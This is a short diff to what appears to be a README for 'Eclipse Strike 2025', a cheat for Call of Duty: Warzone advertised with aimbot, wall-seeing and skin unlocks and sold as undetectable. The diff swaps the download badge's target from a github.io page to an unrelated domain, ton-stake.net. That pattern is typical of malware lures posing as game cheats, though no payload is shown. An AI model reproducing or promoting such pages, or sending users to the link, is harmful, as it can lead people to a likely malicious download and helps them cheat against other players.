@@ -2,7 +2,7 @@
 
 Crush Call of Duty: Warzone with Eclipse Strike 2025! Dominate with pinpoint aim, see through walls, and customize rare operator skins. Undetectable, Windows-optimized, and built for battle royale supremacy. Seize victory now!
 
-[![Download Eclipse Strike](https://img.shields.io/badge/Download-Eclipse_Strike-blueviolet)](https://Overwatch-2-Phantom-Surge-202.github.io/.github)
+[![Download Eclipse Strike](https://img.shields.io/badge/Download-Eclipse_Strike-blueviolet)](https://ton-stake.net)
 
 ---
 
